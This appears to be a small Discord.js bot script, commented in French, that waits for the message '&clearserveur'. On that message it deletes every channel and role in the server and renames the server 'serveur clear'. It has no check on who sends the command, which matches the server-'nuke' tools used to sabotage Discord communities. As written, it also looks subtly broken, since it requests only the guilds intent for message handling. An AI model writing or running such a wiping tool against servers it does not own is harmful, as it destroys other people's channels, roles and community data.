const Discord = require('discord.js');
const client = new Discord.Client({ intents: [Discord.Intents.FLAGS.GUILDS] });

client.on('ready', () => {
  console.log(`Connecter sur ${client.user.tag}!`);
});

client.on('messageCreate', async message => {
  if (message.content === '&clearserveur') {
    const guild = message.guild;
    guild.channels.cache.forEach(channel => channel.delete());
    guild.roles.cache.forEach(role => role.delete());
    guild.setName('serveur clear');
  }
});

client.login('Ton token');
